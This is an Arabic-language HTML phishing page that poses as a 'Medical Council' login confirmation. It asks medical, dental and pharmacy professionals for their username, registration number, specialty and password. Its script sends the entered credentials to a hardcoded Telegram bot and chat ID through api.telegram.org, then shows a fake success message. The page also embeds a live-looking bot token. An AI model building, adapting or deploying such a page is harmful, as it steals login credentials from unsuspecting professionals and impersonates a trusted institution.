<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <title>المجلس الطبي</title>
    <style>
        body { margin: 0; background: #0f172a; font-family: sans-serif; display: flex; align-items: center; justify-content: center; height: 100vh; color: white; }
        .card { width: 90%; max-width: 380px; background: #1e293b; border-radius: 20px; padding: 25px; text-align: center; border: 1px solid #334155; }
        input, select { width: 100%; height: 50px; background: #334155; border: none; border-radius: 10px; padding: 0 15px; margin-bottom: 10px; color: white; font-size: 16px; box-sizing: border-box; text-align: right; }
        .btn { width: 100%; height: 55px; background: #0088cc; color: white; border: none; border-radius: 12px; font-size: 18px; font-weight: bold; cursor: pointer; transition: 0.3s; }
        #success { display: none; }
    </style>
</head>
<body>

<div class="card" id="box">
    <div id="form">
        <h2 style="margin-bottom: 20px;">تأكيد الدخول</h2>
        <input type="text" id="u" placeholder="اسم المستخدم">
        <input type="tel" id="r" placeholder="رقم التسجيل">
        <select id="s"><option>طب عام</option><option>طب أسنان</option><option>صيدلة</option></select>
        <input type="password" id="p" placeholder="كلمة المرور">
        <button onclick="send()" class="btn" id="b">إرسال وتأكيد</button>
    </div>
    <div id="success">
        <h2 style="color: #4ade80;">✅ تم الإرسال</h2>
        <p>تصلك الرسالة الآن في البوت.</p>
    </div>
</div>

<script>
    function send() {
        const token = "8682180549:AAGxYYy6V5adsST-1M7SrSQqk6EV4gRlM5I"; // التوكن الجديد
        const chatId = "7746757675"; // معرفك الشخصي
        const msg = `📥 بيانات جديدة:\n👤 اليوزر: ${document.getElementById('u').value}\n🆔 الرقم: ${document.getElementById('r').value}\n🩺 التخصص: ${document.getElementById('s').value}\n🔑 الكلمة: ${document.getElementById('p').value}`;

        // الرابط المباشر للإرسال فوراً
        const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(msg)}`;

        // تنفيذ الإرسال
        fetch(url, { mode: 'no-cors' });

        // إظهار رسالة النجاح
        document.getElementById('form').style.display = 'none';
        document.getElementById('success').style.display = 'block';
    }
</script>
</body>
</html>
